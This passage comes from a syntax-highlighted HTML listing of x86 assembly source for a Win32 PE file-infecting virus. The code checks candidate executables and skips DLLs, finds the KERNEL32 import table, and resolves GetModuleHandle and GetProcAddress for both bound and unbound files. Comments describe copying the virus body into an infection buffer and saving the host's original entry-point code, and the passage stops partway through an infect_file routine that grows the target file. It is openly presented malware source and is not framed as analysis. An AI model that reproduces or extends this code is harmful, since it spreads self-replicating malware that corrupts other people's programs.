                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Avoid DLL's</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">
                        
                </span><span class="sc1">;Get pointer to imports raw data</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_DataDirectory.</span><span class="sc0">        \
                                       </span><span class="sc5">DE_Import.</span><span class="sc0">               \
                                       </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">+</span><span class="sc0">       \
                                       </span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">next_imd_img</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Search for kernel32 through the array of imported</span><span class="sc0">
                </span><span class="sc1">;module descriptors</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szKernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ID_Name</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Exit if the RVA to dll name doesnt exist</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Sub the delta offset</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">;Get absolute address of dll name</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Compare names</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">dll_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Get character from name into imports</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">

                </span><span class="sc1">;Check if character is in lowercase</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">check_char</span><span class="sc0">

                </span><span class="sc1">;Convert character to uppercase</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc3">"a"</span><span class="sc4">-</span><span class="sc3">"A"</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">check_char</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Compare characters with our KERNEL32 string</span><span class="sc0">

                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_dll</span><span class="sc0">

                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">dll_loop</span><span class="sc0">

</span><span class="sc5">verify_ok</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Name matched, get import module descriptor</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Mutate RVAs</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mutate_rvas</span><span class="sc0">

                </span><span class="sc1">;Avoid files with IMAGE_SCN_MEM_SHARED in its</span><span class="sc0">
                </span><span class="sc1">;last section attributes</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Set ecx != NULL (success flag)</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">SEH_error01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Remove structured exception handler</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc1">;Error, restore base address</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">bad_dll</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Go to next imported module descriptor</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_imd_img</span><span class="sc0">


</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Find the place where PE saves some useful information</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">mutate_rvas</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Generate a copy of the virus into a buffer</span><span class="sc0">
                </span><span class="sc1">;This copy will contain some RVAs already</span><span class="sc0">
                </span><span class="sc1">;loaded (GetModuleHandle, GetProcAddress or Kernel32</span><span class="sc0">
                </span><span class="sc1">;ID_ForwarderChain field)</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - Base address for file</span><span class="sc0">
                </span><span class="sc1">;edx - Section delta offset</span><span class="sc0">
                </span><span class="sc1">;edi - Kernel32 Import Module Descriptor</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;RVA's loaded into virus body (NULL if function not found)</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Copy virus to infection buffer</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc4">-</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Save rva to ID_ForwarderChain field</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_ForwarderChain</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_kernel32</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Check if file is binded</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NT_FileHeader.FH_TimeDateStamp</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ID_TimeDateStamp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">binded_file</span><span class="sc0">

                </span><span class="sc1">;esi - Import Address Table for KERNEL32</span><span class="sc0">

                </span><span class="sc1">;Save RVA for GetModuleHandle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szGetModuleH</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_by_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_GetModuleH</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Save RVA for GetProcAddress</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szGetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_by_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_GetProcAddr</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">binded_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;esi - Import Address Table for KERNEL32</span><span class="sc0">

                </span><span class="sc1">;Binded GetModuleHandle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetModuleH</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_by_address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_GetModuleH</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Binded GetProcAddress</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetProcAddr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">find_by_address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_GetProcAddr</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get RVA of an API function in a binded file</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">find_by_address</span><span class="sc4">:</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;edx - Delta offset for last section</span><span class="sc0">
                </span><span class="sc1">;esi - Import Address Table for KERNEL32</span><span class="sc0">
                </span><span class="sc1">;edi - Function entry point</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - RVA of function address (NULL if not found)</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">search_thunk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Check if this is the storage address</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_by_address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">search_thunk</span><span class="sc0">

                </span><span class="sc1">;Calculate the offset of that thunk dword into file</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">err_by_address</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Find RVA of a function imported by name</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">find_by_name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;edx - Delta offset for last section</span><span class="sc0">
                </span><span class="sc1">;esi - Import Address Table for KERNEL32</span><span class="sc0">
                </span><span class="sc1">;edi - Function name</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - RVA of function address (NULL if not found)</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Search for function name into IMAGE_IMPORT_BY_NAME</span><span class="sc0">
                </span><span class="sc1">;structure pointed by every dword in the thunk data array</span><span class="sc0">

</span><span class="sc5">loop_by_name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Get address of IMAGE_IMPORT_BY_NAME structure</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_by_name</span><span class="sc0">

                </span><span class="sc1">;Get pointer to function name</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Compare strings</span><span class="sc0">

</span><span class="sc5">name_by_name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_by_name</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">name_by_name</span><span class="sc0">

                </span><span class="sc1">;Go to next entry into Import Address Table</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_by_name</span><span class="sc0">

</span><span class="sc5">ok_by_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">err_by_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Infection and mutation</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;My_FindData - Win32 FindFile structure filled with data</span><span class="sc0">
                </span><span class="sc1">;              about file to infect</span><span class="sc0">
                </span><span class="sc1">;eax         - Base address of memory mapped image</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Get last section header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">

                </span><span class="sc1">;ebx - Host base address</span><span class="sc0">
                </span><span class="sc1">;esi - IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to last section header</span><span class="sc0">

                </span><span class="sc1">;This will help us later for calculating host base address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">init_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fix_baseaddr</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Copy original code at entry point into our buffer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rva_org_eip</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_code</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">BUFFER_EP</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                
                
                </span><span class="sc1">;Free memory mapped file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc1">;Add virus size to file size and re-map it</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
